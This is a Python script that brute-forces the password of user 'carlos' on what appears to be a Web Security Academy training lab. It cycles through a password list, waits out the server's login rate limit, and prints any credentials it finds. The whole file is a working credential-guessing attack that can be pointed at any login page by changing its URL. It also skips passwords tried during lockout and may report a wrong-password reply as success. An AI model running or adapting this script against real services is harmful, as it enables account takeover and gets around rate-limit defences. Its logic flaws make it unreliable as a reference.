# This script bruteforces a password from a list, checks when rate limit is hit and then continue
# Target server takes the type 'application/json', if it instead would be 'application/x-www-form-urlencoded'
# make sure to set data=data instead of json=data in the requests.post

import requests
import time

url = 'https://0acd001103f9533281d939c7007600f4.web-security-academy.net/login'
headers_base = {
    'Content-Type': 'application/json',
    'Cookie': 'session=Ozx7AfcmG6wWao4R7nqRQzsoDoYxNn5F'
}

with open('list_of_passwords.txt') as f:
    for password in f:
        password = password.strip()
        headers = headers_base.copy()

        data = {'username': 'carlos', 'password': password}
        response = requests.post(url, headers=headers, json=data)

        # Check response
        if 'too many incorrect login attempts' in response.text.lower():
            print("[!] Rate limit hit. Waiting 66 seconds...")
            time.sleep(66)
            continue

        if 'Invalid username' not in response.text:
            print(f"[+] Success! Username: carlos, Password: {password}")
            print(response.text)
            break
        else:
            print(f"[-] Tried: {password}")
